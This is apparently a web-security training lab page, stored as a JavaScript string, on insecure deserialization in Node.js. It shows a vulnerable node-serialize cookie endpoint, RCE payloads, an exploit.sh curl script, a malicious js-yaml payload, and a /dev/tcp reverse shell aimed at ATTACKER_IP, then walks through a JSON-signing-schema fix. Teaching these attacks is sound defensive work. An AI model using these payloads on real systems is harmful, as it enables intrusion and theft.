window.LESSONS = window.LESSONS || {};
window.LESSONS.deser = `

<h1 class="lesson-title">Lab 10: Insecure Deserialization</h1>

<p class="lesson-subtitle">
  How a cookie value becomes remote code execution, and why certain serialization formats should never
  touch untrusted data.
</p>

<hr>

<h2 class="step"><span class="step-label">Step 1</span> What Is Serialization?</h2>

<p>
  Before we break anything, let me make sure we are on the same page about what serialization actually is.
  At its core, serialization is the process of converting an in-memory object into a string (or byte stream)
  that you can store in a database, send over a network, or stuff into a cookie. Deserialization is the
  reverse -- you take that string and reconstruct the original object in memory. Every time you call
  <code class="fn">JSON.stringify</code> on an object and later call <code class="fn">JSON.parse</code>
  on the resulting string, you are serializing and deserializing. Simple enough.
</p>

<p>
  Here is the thing that makes JSON safe: it can only represent <em>data</em>. Strings, numbers, booleans,
  arrays, and plain objects. That is the entire universe of JSON. You cannot represent a function in JSON.
  You cannot represent a class instance with methods. You cannot encode executable code. When you call
  <code class="fn">JSON.parse</code> on a string, the worst thing that can happen is you get back some
  unexpected data. The parser will never <em>execute</em> anything.
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">safe-serialization.js</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
<span class="cmt">// JSON serialization: data only, no code execution</span>
<span class="kw">const</span> user = { name: <span class="str">"alice"</span>, role: <span class="str">"admin"</span> };

<span class="kw">const</span> serialized = <span class="fn">JSON.stringify</span>(user);
<span class="cmt">// '{"name":"alice","role":"admin"}'</span>

<span class="kw">const</span> deserialized = <span class="fn">JSON.parse</span>(serialized);
<span class="cmt">// { name: "alice", role: "admin" } -- just data, nothing executed</span>
  </pre>
</div>

<p>
  Now here is where things go sideways. Not all serialization formats are limited to data. Some formats
  can represent <em>functions</em>, <em>class constructors</em>, and other executable structures. And
  when a deserializer encounters one of these executable representations, it does exactly what you would
  fear: it reconstructs the function. And if that function is set up to invoke itself immediately, it
  <em>runs during deserialization</em>. You read a string, and code executes. That is the fundamental
  issue with insecure deserialization: you are feeding untrusted input into a deserializer that is
  capable of executing code.
</p>

<p>
  This is not a theoretical concern. This is how real remote code execution vulnerabilities work in
  production systems across every major language ecosystem. Java has <code>ObjectInputStream</code>.
  Python has <code>pickle</code>. PHP has <code class="fn">unserialize()</code>. Ruby has
  <code>Marshal.load</code>. And JavaScript has its own offenders, which we are about to explore.
</p>

<hr>

<h2 class="step"><span class="step-label">Step 2</span> Build the Vulnerable Endpoint</h2>

<p>
  Let me set the scene. You are building a "remember me" feature for your Express application. When a user
  checks the "remember me" box during login, you want to store their profile data in a cookie so you can
  personalize their experience on return visits without hitting the database. Sounds reasonable, right?
  Developers do this all the time.
</p>

<p>
  Now, instead of using JSON to serialize the profile data, someone on the team decided to use a package
  called <code>node-serialize</code>. Maybe they found it on npm and thought it offered some advantage
  over plain JSON. Maybe they needed to serialize something JSON could not handle and reached for the
  first result that came up. Whatever the reason, this decision is about to turn a cookie into a remote
  code execution vector.
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">routes/profile.js</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
<span class="kw">const</span> express = <span class="fn">require</span>(<span class="str">'express'</span>);
<span class="kw">const</span> serialize = <span class="fn">require</span>(<span class="str">'node-serialize'</span>);
<span class="kw">const</span> router = express.<span class="fn">Router</span>();

<span class="cmt">// On login: serialize user profile into a base64 cookie</span>
router.<span class="fn">post</span>(<span class="str">'/login'</span>, (req, res) => {
  <span class="kw">const</span> user = <span class="fn">authenticateUser</span>(req.body);
  <span class="kw">if</span> (user) {
    <span class="kw">const</span> profileData = serialize.<span class="fn">serialize</span>(user);
    <span class="kw">const</span> encoded = Buffer.<span class="fn">from</span>(profileData).<span class="fn">toString</span>(<span class="str">'base64'</span>);
    res.<span class="fn">cookie</span>(<span class="str">'profile'</span>, encoded);
    res.<span class="fn">redirect</span>(<span class="str">'/dashboard'</span>);
  }
});

<span class="cmt">// On every request: deserialize the cookie to get user data</span>
router.<span class="fn">get</span>(<span class="str">'/dashboard'</span>, (req, res) => {
  <span class="kw">const</span> profileCookie = req.cookies.profile;
  <span class="kw">if</span> (profileCookie) {
    <span class="cmt">// THIS IS THE VULNERABILITY</span>
    <span class="kw">const</span> profile = serialize.<span class="fn">unserialize</span>(
      Buffer.<span class="fn">from</span>(profileCookie, <span class="str">'base64'</span>).<span class="fn">toString</span>()
    );
    res.<span class="fn">render</span>(<span class="str">'dashboard'</span>, { user: profile });
  }
});
  </pre>
</div>

<p>
  Let me explain why <code>node-serialize</code> is specifically dangerous. Unlike JSON, this library
  has a special internal marker: <code class="str">_$$ND_FUNC$$_</code>. When the serializer encounters
  a function in an object, it converts it to a string prefixed with this marker. When the deserializer
  -- <code class="fn">unserialize()</code> -- encounters this marker during parsing, it reconstructs
  the function from the string representation. It literally calls <code class="kw">eval()</code> or
  <code class="kw">new Function()</code> under the hood to bring that function back to life.
</p>

<p>
  And here is the critical detail: if that reconstructed function is an IIFE -- an immediately invoked
  function expression, meaning it has <code>()</code> at the end -- it does not just get reconstructed.
  It gets <em>executed</em>. Right there. During deserialization. The server reads a cookie, and
  arbitrary code runs.
</p>

<div class="callout warn">
  <div class="callout-title">Why This Matters</div>
  <div class="callout-text">
    The cookie is entirely controlled by the client. An attacker does not need to authenticate. They do not
    need to find a separate vulnerability first. They simply craft a malicious cookie, send it with a
    request, and the server executes whatever code they put inside it. The server is literally running
    attacker-supplied code during the act of reading a cookie.
  </div>
</div>

<hr>

<h2 class="step"><span class="step-label">Step 3</span> The Attack -- Remote Code Execution</h2>

<p>
  Now you are going to build the payload that turns this cookie into full remote code execution. This is
  the part where you think like an attacker, and I promise you, once you see how simple this is, you will
  never look at deserialization the same way again.
</p>

<p>
  The payload structure looks like this:
</p>

<div class="attack-box">
  <div class="attack-box-title">Malicious Serialized Payload</div>
  <pre>
{"username":"_$$ND_FUNC$$_function(){ require('child_process').execSync('id > /tmp/pwned.txt') }()"}
  </pre>
</div>

<p>
  Let me walk through exactly what happens when this payload reaches the server:
</p>

<ol>
  <li>The attacker base64-encodes this JSON string and sets it as the value of the <code>profile</code> cookie.</li>
  <li>The server receives the request, reads the cookie, and base64-decodes it back to the JSON string above.</li>
  <li>The server passes the decoded string to <code class="fn">serialize.unserialize()</code>.</li>
  <li><code>node-serialize</code> parses the object. It encounters the <code class="str">_$$ND_FUNC$$_</code> marker on the <code>username</code> property.</li>
  <li>It reconstructs the function: <code class="kw">function</code>() { require('child_process').execSync('id > /tmp/pwned.txt') }</li>
  <li>It sees the trailing <code>()</code> -- this is an IIFE. The function is invoked immediately.</li>
  <li><code class="fn">require</code>(<span class="str">'child_process'</span>).<span class="fn">execSync</span>() runs. The <code>id</code> command executes on the server. The output is written to <code>/tmp/pwned.txt</code>.</li>
</ol>

<p>
  That is full remote code execution from a cookie value. The attacker can run <em>any</em> system command.
  They can read files, install backdoors, establish reverse shells, pivot to internal networks -- everything.
  The server process runs with whatever privileges the Node.js application has, and that is usually far
  more access than you would want an attacker to have.
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">exploit.sh</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
<span class="cmt"># Step 1: Create the malicious payload</span>
<span class="kw">PAYLOAD</span>=<span class="str">'{"username":"_$$ND_FUNC$$_function(){ require(\\'child_process\\').execSync(\\'id > /tmp/pwned.txt\\') }()"}'</span>

<span class="cmt"># Step 2: Base64-encode it</span>
<span class="kw">ENCODED</span>=$(<span class="fn">echo</span> -n <span class="str">"\${PAYLOAD}"</span> | <span class="fn">base64</span>)

<span class="cmt"># Step 3: Send it as a cookie</span>
<span class="fn">curl</span> http://localhost:<span class="num">3000</span>/dashboard \\
  --cookie <span class="str">"profile=\${ENCODED}"</span>

<span class="cmt"># Step 4: Verify code execution</span>
<span class="fn">cat</span> /tmp/pwned.txt
<span class="cmt"># uid=1000(nodeapp) gid=1000(nodeapp) groups=1000(nodeapp)</span>
  </pre>
</div>

<p>
  Look at how little stands between the attacker and code execution. There is no authentication required.
  There is no WAF that would catch this by default because the payload is base64-encoded. There is no
  input validation on the cookie value. The server just blindly trusts and deserializes whatever it
  receives. This is why insecure deserialization consistently ranks on the OWASP Top 10.
</p>

<hr>

<h2 class="step"><span class="step-label">Step 4</span> YAML Deserialization in JavaScript</h2>

<p>
  I want to make sure you understand that <code>node-serialize</code> is not the only dangerous deserializer
  in the JavaScript ecosystem. Let me introduce you to another vector that catches people off guard: YAML.
</p>

<p>
  YAML is a data serialization format that many developers use for configuration files. It is more
  human-readable than JSON and supports features like comments, multiline strings, and anchors. The
  most popular YAML parser in the Node.js ecosystem is <code>js-yaml</code>. And in versions before v4,
  the default <code class="fn">yaml.load()</code> function was capable of something terrifying: it could
  instantiate arbitrary JavaScript objects.
</p>

<p>
  YAML has a tag system that lets you annotate values with types. The <code>!!js/function</code> tag
  tells the parser to treat the following string as a JavaScript function and construct it:
</p>

<div class="attack-box">
  <div class="attack-box-title">Malicious YAML Payload</div>
  <pre>
greeting: Hello
callback: !!js/function |-
  function() {
    require('child_process').execSync('whoami > /tmp/yaml-pwned.txt');
  }
  </pre>
</div>

<p>
  When <code class="fn">yaml.load()</code> in js-yaml v3 or earlier encounters the <code>!!js/function</code>
  tag, it constructs a real JavaScript function object. If the application then calls that function --
  or if the YAML contains a tag that triggers immediate execution -- you get the same result as the
  node-serialize attack: arbitrary code execution from data that was supposed to be "just configuration."
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">yaml-vuln.js</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
<span class="kw">const</span> yaml = <span class="fn">require</span>(<span class="str">'js-yaml'</span>);

<span class="cmt">// DANGEROUS: yaml.load() in js-yaml &lt; v4 processes all YAML tags</span>
<span class="cmt">// including !!js/function, !!js/regexp, !!js/undefined</span>
<span class="kw">const</span> config = yaml.<span class="fn">load</span>(userSuppliedYaml);
<span class="cmt">// If userSuppliedYaml contains !!js/function, you now have</span>
<span class="cmt">// a real Function object in your config</span>

<span class="cmt">// SAFE: yaml.safeLoad() or yaml.load() in js-yaml v4+</span>
<span class="cmt">// Only processes standard YAML tags -- no JS object instantiation</span>
<span class="kw">const</span> safeConfig = yaml.<span class="fn">load</span>(userSuppliedYaml, { schema: yaml.JSON_SCHEMA });
  </pre>
</div>

<p>
  The good news is that <code>js-yaml</code> v4 and later changed the default behavior of
  <code class="fn">yaml.load()</code> to safe mode -- it no longer processes JavaScript-specific tags
  by default. But there are still applications running on older versions, and there are still developers
  who explicitly opt into the unsafe schema because they "need" the extra functionality. Every one of
  those is a potential deserialization vulnerability.
</p>

<div class="callout info">
  <div class="callout-title">The Pattern Is Always the Same</div>
  <div class="callout-text">
    Whether it is <code>node-serialize</code>, old <code>js-yaml</code>, Java's
    <code>ObjectInputStream</code>, Python's <code>pickle</code>, or PHP's <code>unserialize()</code>,
    the vulnerability pattern is identical: a deserialization format that can represent executable code
    is fed untrusted input. The language changes. The specific mechanism changes. The fundamental
    mistake never does.
  </div>
</div>

<hr>

<h2 class="step"><span class="step-label">Step 5</span> The Fix -- JSON + Signing + Schema Validation</h2>

<p>
  Fixing insecure deserialization is not about finding the right configuration option for
  <code>node-serialize</code>. It is about replacing the dangerous deserializer entirely. Here is the
  defense-in-depth approach that actually works:
</p>

<h3>Layer 1: Use JSON -- Eliminate Code Execution</h3>

<p>
  Replace <code>node-serialize</code> with <code class="fn">JSON.parse()</code> and
  <code class="fn">JSON.stringify()</code>. JSON cannot represent functions. Period. There is no marker,
  no tag, no trick that makes <code class="fn">JSON.parse()</code> execute code. By switching to JSON,
  you eliminate the entire class of vulnerability. The attacker can send whatever they want in the cookie,
  and the worst outcome is a parsing error or unexpected data values.
</p>

<h3>Layer 2: Sign Cookies -- Prevent Tampering</h3>

<p>
  Even with JSON, you do not want attackers modifying cookie contents. Use HMAC signing to ensure the
  cookie has not been tampered with. Express supports this through the <code>cookie-parser</code>
  middleware with a secret, or you can use a dedicated library. When the server sets the cookie, it
  computes an HMAC over the value using a server-side secret. When it reads the cookie back, it
  recomputes the HMAC and compares. If the values do not match, the cookie was tampered with and gets
  rejected before deserialization ever happens.
</p>

<h3>Layer 3: Validate the Schema -- Enforce Data Shape</h3>

<p>
  Even signed, valid JSON should be validated against a schema before you trust it. Use a library like
  Joi or Zod to define exactly what shape the profile data should have. If someone manages to bypass
  signing (perhaps through a separate vulnerability), schema validation catches unexpected fields,
  wrong types, or values outside expected ranges.
</p>

<div class="fix-box">
  <div class="fix-box-title">Secure Implementation</div>
  <pre>
<span class="kw">const</span> express = <span class="fn">require</span>(<span class="str">'express'</span>);
<span class="kw">const</span> cookieParser = <span class="fn">require</span>(<span class="str">'cookie-parser'</span>);
<span class="kw">const</span> { z } = <span class="fn">require</span>(<span class="str">'zod'</span>);
<span class="kw">const</span> app = <span class="fn">express</span>();

<span class="cmt">// Signed cookies: tampered values are automatically rejected</span>
app.<span class="fn">use</span>(<span class="fn">cookieParser</span>(process.env.COOKIE_SECRET));

<span class="cmt">// Schema: define exactly what profile data looks like</span>
<span class="kw">const</span> ProfileSchema = z.<span class="fn">object</span>({
  username: z.<span class="fn">string</span>().<span class="fn">min</span>(<span class="num">1</span>).<span class="fn">max</span>(<span class="num">50</span>),
  role: z.<span class="fn">enum</span>([<span class="str">'user'</span>, <span class="str">'editor'</span>, <span class="str">'admin'</span>]),
  email: z.<span class="fn">string</span>().<span class="fn">email</span>(),
});

<span class="cmt">// Set cookie: JSON + signed</span>
router.<span class="fn">post</span>(<span class="str">'/login'</span>, (req, res) => {
  <span class="kw">const</span> user = <span class="fn">authenticateUser</span>(req.body);
  <span class="kw">if</span> (user) {
    <span class="kw">const</span> profileData = <span class="fn">JSON.stringify</span>({
      username: user.username,
      role: user.role,
      email: user.email,
    });
    res.<span class="fn">cookie</span>(<span class="str">'profile'</span>, profileData, { signed: <span class="kw">true</span>, httpOnly: <span class="kw">true</span> });
    res.<span class="fn">redirect</span>(<span class="str">'/dashboard'</span>);
  }
});

<span class="cmt">// Read cookie: verify signature, parse JSON, validate schema</span>
router.<span class="fn">get</span>(<span class="str">'/dashboard'</span>, (req, res) => {
  <span class="kw">const</span> profileCookie = req.signedCookies.profile;
  <span class="kw">if</span> (!profileCookie) <span class="kw">return</span> res.<span class="fn">redirect</span>(<span class="str">'/login'</span>);

  <span class="kw">try</span> {
    <span class="kw">const</span> parsed = <span class="fn">JSON.parse</span>(profileCookie);
    <span class="kw">const</span> profile = ProfileSchema.<span class="fn">parse</span>(parsed);
    res.<span class="fn">render</span>(<span class="str">'dashboard'</span>, { user: profile });
  } <span class="kw">catch</span> (err) {
    res.<span class="fn">clearCookie</span>(<span class="str">'profile'</span>);
    res.<span class="fn">redirect</span>(<span class="str">'/login'</span>);
  }
});
  </pre>
</div>

<p>
  Notice how each layer handles a different threat. JSON eliminates code execution. Signing eliminates
  tampering. Schema validation eliminates unexpected data shapes. An attacker would have to bypass all
  three layers to cause harm, and the first layer alone -- switching to JSON -- would have stopped the
  RCE attack completely. This is defense in depth done right.
</p>

<hr>

<h2 class="step"><span class="step-label">Deeper</span> The Serialization Security Principle</h2>

<p>
  I want you to take away one principle from this entire lab, and I want it burned into your memory:
  <strong>never deserialize untrusted data with a format that supports code execution</strong>. That is it.
  That is the whole rule.
</p>

<p>
  The safe serialization formats are the ones that can only represent data: JSON, MessagePack, Protocol
  Buffers, FlatBuffers, Avro. These formats have no concept of functions, classes, or executable code.
  Their parsers are incapable of executing anything. Use them.
</p>

<p>
  The dangerous formats are the ones that can represent code or complex object types: <code>node-serialize</code>
  in JavaScript, <code>pickle</code> in Python, <code>ObjectInputStream</code> in Java,
  <code class="fn">unserialize()</code> in PHP, <code>Marshal.load</code> in Ruby, and unsafe YAML
  loaders in any language. If you must use one of these formats internally (and sometimes there are
  legitimate reasons), never feed them data that comes from outside your trust boundary. Never from
  cookies. Never from request bodies. Never from message queues that external systems can write to.
  Never from files that users can upload.
</p>

<p>
  And if you are reviewing code and you see a deserialization call that takes user input, treat it as
  the highest-severity finding you can report. Insecure deserialization is almost always a direct path
  to remote code execution, and RCE is the end of the game for the defender.
</p>

<hr>

<h2 class="step"><span class="step-label">Deeper</span> From RCE to Reverse Shell</h2>

<p>
  Running <code>id</code> or <code>whoami</code> through a deserialization payload proves the vulnerability
  exists, but an attacker does not stop there. The real escalation is getting an interactive shell on the
  target machine. Let me show you what that looks like, because understanding the full attack chain is
  essential for appreciating why deserialization bugs are treated as critical severity.
</p>

<div class="attack-box">
  <div class="attack-box-title">Attack: Reverse Shell via Deserialization</div>
  <pre>
<span class="cmt">// The attacker first starts a listener on their machine:</span>
<span class="cmt">// nc -lvp 4444</span>

<span class="cmt">// Then crafts a payload that connects back to the listener</span>
<span class="kw">const</span> payload <span class="op">=</span> {
  rce: <span class="str">"_$$ND_FUNC$$_function(){require('child_process').exec('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1')}()"</span>
};

<span class="cmt">// Base64 encode and send as cookie</span>
<span class="kw">const</span> encoded <span class="op">=</span> Buffer.<span class="fn">from</span>(
  JSON.<span class="fn">stringify</span>(payload)
).<span class="fn">toString</span>(<span class="str">'base64'</span>);

<span class="cmt">// curl -b "profile=ENCODED_PAYLOAD" http://localhost:3000/dashboard</span>
<span class="cmt">// The attacker's netcat listener receives an interactive bash shell</span>
<span class="cmt">// They can now browse files, install backdoors, pivot to other systems</span>
  </pre>
</div>

<p>
  From a single tampered cookie to a full interactive shell on the server. The attacker can now
  read <code>.env</code> files, dump the database, install persistence mechanisms, and pivot to other
  services on the network. This is why every deserialization vulnerability is treated as a direct path
  to total system compromise. There is no "limited impact" version of this bug.
</p>

<p>
  On Windows targets, the payload changes to PowerShell, but the principle is identical. The
  attacker constructs a reverse shell command appropriate to the target OS and delivers it through
  the deserialization vector. The deserialization function does not care what the code does -- it
  just executes whatever function it finds.
</p>

<hr>

<h2>Lab Checklist</h2>

<ul class="task-list">
  <li><span class="task-check"></span> Build the vulnerable "remember me" endpoint using <code>node-serialize</code> and confirm it deserializes cookie data on each request</li>
  <li><span class="task-check"></span> Craft the IIFE payload with <code>_$$ND_FUNC$$_</code>, base64-encode it, and achieve RCE by sending it as a cookie</li>
  <li><span class="task-check"></span> Escalate from simple command execution to a reverse shell and verify interactive access to the server</li>
  <li><span class="task-check"></span> Verify code execution by checking that your command's output appears on the server filesystem</li>
  <li><span class="task-check"></span> Replace <code>node-serialize</code> with JSON.parse, add HMAC cookie signing, and add Zod schema validation</li>
  <li><span class="task-check"></span> Confirm the exploit payload is now rejected at every layer -- JSON.parse throws, signing rejects tampered cookies, and schema validation catches unexpected shapes</li>
</ul>

<div class="section-nav">
  <button class="nav-btn" data-prev="proto">Previous: Prototype Pollution</button>
  <button class="nav-btn" data-next="path">Next: Path Traversal</button>
</div>

`;
